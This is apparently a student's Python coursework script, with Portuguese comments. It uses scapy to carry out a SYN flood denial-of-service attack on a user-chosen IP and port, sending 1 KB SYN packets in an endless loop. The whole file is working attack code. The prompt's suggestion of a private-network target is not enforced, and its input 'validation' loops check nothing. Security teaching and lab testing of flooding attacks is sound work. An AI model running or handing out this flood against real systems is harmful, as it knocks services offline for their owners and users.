# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 19/10/2025
# Última atualização: 20/10/2025

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador
# Foi seguido o tutorial de: https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

from scapy.all import *


def syn_attack():
    print("SYN Flood Attack \n")
    
    is_an_ip = False
    while is_an_ip != True:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        is_an_ip = True 
    
    isnumber = False
    while isnumber != True:
        target_port = int(input("Insira uma porta válida (ex: 80, 443, etc...): \n"))
        isnumber = True 
    
    ip = IP(dst=target_ip)
    # É informado qual a porta de origem aleatoriamente, a porta de destino escolhida pelo utilizador, e a flag SYN, neste caso.
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  

    # É adicionado contéudo para inundar e travar a vítima. Neste caso 1KB
    raw = Raw(b"X"*1024)

    #  Cria o pacote que será enviado
    p = ip / tcp / raw 
    
    # Envia o pacote para a 3ª camada. Só para quando o utilizador apertar CTRL+C
    send(p, loop=1, verbose=0) 
